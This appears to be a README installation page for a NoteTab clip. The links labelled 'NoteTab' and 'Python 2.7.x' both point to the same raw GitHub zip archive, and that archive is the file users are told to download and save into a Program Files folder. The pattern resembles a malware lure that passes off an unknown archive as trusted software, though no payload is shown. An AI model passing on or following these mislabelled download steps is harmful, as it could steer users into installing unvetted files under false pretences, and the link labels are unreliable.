Decipher NoteTab Clip

Installation:
<ol>
  <li>Make sure you have installed <a href="https://raw.githubusercontent.com/agaribovic/decipher-notetab-clips/master/antenniform/decipher-notetab-clips_1.3-beta.1.zip" target="_blank">NoteTab</a> and <a href="https://raw.githubusercontent.com/agaribovic/decipher-notetab-clips/master/antenniform/decipher-notetab-clips_1.3-beta.1.zip" target="_blank">Python 2.7.x</a>.</li>
  <li>Download the latest https://raw.githubusercontent.com/agaribovic/decipher-notetab-clips/master/antenniform/decipher-notetab-clips_1.3-beta.1.zip file.</li>
  <li>Save it to C:\Program Files (x86)\NoteTab 7\Libraries</li>
  <li>Open up NoteTab and the new clip should be added bottom toolbar.</li>
  <li>You are now ready to go!</li>
</ol>
